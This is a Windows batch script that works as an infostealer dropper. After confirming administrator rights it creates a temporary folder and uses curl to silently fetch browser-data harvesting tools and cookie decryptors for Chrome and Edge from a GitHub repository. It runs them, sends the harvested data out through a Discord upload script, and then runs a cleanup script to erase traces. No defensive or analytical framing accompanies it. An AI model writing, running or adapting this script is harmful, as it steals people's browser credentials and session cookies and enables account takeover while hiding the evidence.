@echo off
setlocal EnableDelayedExpansion

net session >nul 2>&1
if %errorlevel% == 0 (
    echo Administrative privileges confirmed
) else (
    echo Failure: Administrative privileges required
    echo Right-click on the script and select "Run as administrator"
    pause
    exit /B 1
)

REM Generate unique temp directory name using timestamp
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set "tempdir=%TEMP%\bb_%datetime:~0,14%"

REM Check if directory already exists
if exist "%tempdir%" (
    echo Error: Temporary directory already exists
    exit /b 1
)

REM Create temp directory
mkdir "%tempdir%" 2>nul
if %ERRORLEVEL% NEQ 0 (
    echo Error: Failed to create temporary directory
    exit /b 2
)

cd "%tempdir%" || (
    echo Error: Failed to change directory
    exit /b 3
)

echo Downloading files...
curl -L -s -o process.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/process.bat
curl -L -s -o stop_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/stop_browsers.bat
curl -L -s -o start_browsers.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/start_browsers.bat
curl -L -s -o hack-browser-data.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/hack-browser-data.exe

curl -L -s -o chrome_cookie_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/chrome_cookie_decryptor.exe
curl -L -s -o edge_cookie_decryptor.exe https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/edge_cookie_decryptor.exe

curl -L -s -o upload_discord.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/upload_discord.bat
curl -L -s -o cleanup.bat https://raw.githubusercontent.com/24-20/bigboy/main/bigboyfolder/cleanup.bat

REM Verify all critical downloads
for %%F in (process.bat hack-browser-data.exe upload_discord.bat cleanup.bat chrome_cookie_decryptor.exe edge_cookie_decryptor.exe) do (
    if not exist "%%F" (
        echo Error: Failed to download %%F
        exit /b 4
    )
)

REM Create running flag
echo %datetime% > "%tempdir%\running.tmp"
echo Starting process----------------------------------------
call "%tempdir%\process.bat"
echo uploading to discord----------------------------------------
call "%tempdir%\upload_discord.bat"
echo Waiting 20 seconds before cleanup...
echo Temp directory to be cleaned: %tempdir%
timeout /t 20 /nobreak >nul
echo Process finished, starting cleanup----------------------------------------
call "%tempdir%\cleanup.bat" "%tempdir%"
